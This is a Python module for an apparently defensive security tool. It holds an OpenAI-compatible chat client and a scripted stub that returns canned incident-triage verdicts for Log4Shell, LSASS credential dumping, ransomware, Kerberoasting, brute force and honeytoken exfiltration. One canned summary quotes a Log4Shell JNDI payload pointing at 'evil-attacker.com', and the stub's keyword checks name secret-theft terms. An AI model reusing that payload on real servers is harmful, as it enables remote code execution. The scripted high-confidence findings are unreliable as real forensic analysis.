from __future__ import annotations

import json

import httpx2

from terminus.http import create_async_client
from terminus.llm.base import JsonValue, LlmClient, LlmError


class OpenAiCompatibleLlm(LlmClient):
    def __init__(self, base_url: str, api_key: str, model: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.model = model

    async def respond_json(self, system: str, user: str) -> dict[str, JsonValue]:
        async with create_async_client() as client:
            try:
                response = await client.post(
                    f"{self.base_url}/chat/completions",
                    headers={
                        "Authorization": f"Bearer {self.api_key}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": self.model,
                        "messages": [
                            {"role": "system", "content": system},
                            {"role": "user", "content": user},
                        ],
                        "response_format": {"type": "json_object"},
                    },
                )
                response.raise_for_status()
                data = response.json()
                content = data["choices"][0]["message"]["content"]
                result = json.loads(content)
                if not isinstance(result, dict):
                    raise LlmError("Expected JSON object")
                return result
            except (httpx2.HTTPError, json.JSONDecodeError, KeyError) as e:
                raise LlmError(f"LLM request failed: {e}") from e


class ScriptedLlm(LlmClient):
    def __init__(self) -> None:
        pass

    async def respond_json(self, system: str, user: str) -> dict[str, JsonValue]:
        user_upper = user.upper()
        
        if "LOG4J" in user_upper or "44228" in user_upper or "JNDI" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Remote Code Execution payload detected targeting NGINX web server via JNDI LDAP lookup string (${jndi:ldap://evil-attacker.com:1389/a}). Vector indicates active exploitation attempt for CVE-2021-44228.",
                "recommended_actions": [
                    "Immediately block source IP 192.168.1.100 at boundary firewall",
                    "Isolate endpoint prod-web-front-01 from internal subnet",
                    "Patch Java runtime & update log4j2 library to >= 2.17.1",
                    "Rotate database service account credentials"
                ],
            }
        elif "LSASS" in user_upper or "1003" in user_upper or "DUMP" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Credential Access activity detected (MITRE ATT&CK T1003). LSASS memory access attempt executed by unauthorized process. High probability of Mimikatz or ProcDump execution.",
                "recommended_actions": [
                    "Kill unauthorized process ID",
                    "Revoke domain admin credentials for affected workstation",
                    "Enforce LSA Protection (RunAsPPL) via Group Policy",
                    "Initiate endpoint memory triage"
                ],
            }
        elif "RANSOMWARE" in user_upper or "1486" in user_upper or "ENCRYPT" in user_upper:
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: High-velocity file modification and extension manipulation detected (.locked extensions). Active Ransomware activity (MITRE T1486).",
                "recommended_actions": [
                    "Isolate host network interface immediately",
                    "Trigger automated volume shadow copy recovery",
                    "Revoke domain machine account access"
                ],
            }
        elif "KERBEROAST" in user_upper or "1558" in user_upper or "TGS" in user_upper:
            return {
                "severity": "high",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: High-volume Kerberos TGS requests (RC4-HMAC encryption) detected targeting service accounts. Pattern indicates active Kerberoasting attack to offline crack SPN passwords.",
                "recommended_actions": [
                    "Force password reset on targeted SPN service accounts",
                    "Upgrade SPN encryption to AES256-CTS-HMAC-SHA1-96",
                    "Audit Active Directory TGS request logs for anomalous user accounts"
                ],
            }
        elif "BRUTE" in user_upper or "PASSWORD SPRAY" in user_upper:
            return {
                "severity": "high",
                "confidence": "high",
                "summary": "AI AGENT FORENSIC ANALYSIS: Automated SSH password spraying attack detected. 45 failed authentication attempts within 60 seconds targeting root and admin accounts.",
                "recommended_actions": [
                    "Add attacker IP to fail2ban dynamic blocklist",
                    "Enforce SSH public key authentication and disable password logins",
                    "Verify root login is disabled in sshd_config"
                ],
            }
        elif (
            "CANARY" in user_upper
            or "HONEYTOKEN" in user_upper
            or "EXFILTRAT" in user_upper
            or "AWS_KEY" in user_upper
            or "VAULT" in user_upper
            or "PII" in user_upper
            or "T1567" in user_upper
            or "T1552" in user_upper
        ):
            return {
                "severity": "critical",
                "confidence": "high",
                "summary": "AI AGENT INTERCEPTION: Honeytoken / Canary credential trigger detected (MITRE ATT&CK T1552 / T1567). Unauthorized actor accessed decoy credentials 'AKIA_CANARY_HONEYTOKEN_9941_REDTEAM' and attempted exfiltration of synthetic vault secrets.",
                "recommended_actions": [
                    "Isolate compromised endpoint immediately via boundary firewall",
                    "Invalidate exposed AWS session token and revoke canary credentials",
                    "Block attacker C2 egress IP at border gateway",
                    "Execute forensic memory capture on targeted decoy container",
                ],
            }
        else:
            return {
                "severity": "medium",
                "confidence": "high",
                "summary": "Scripted test summary.",
                "recommended_actions": ["Isolate host", "Check logs"],
            }
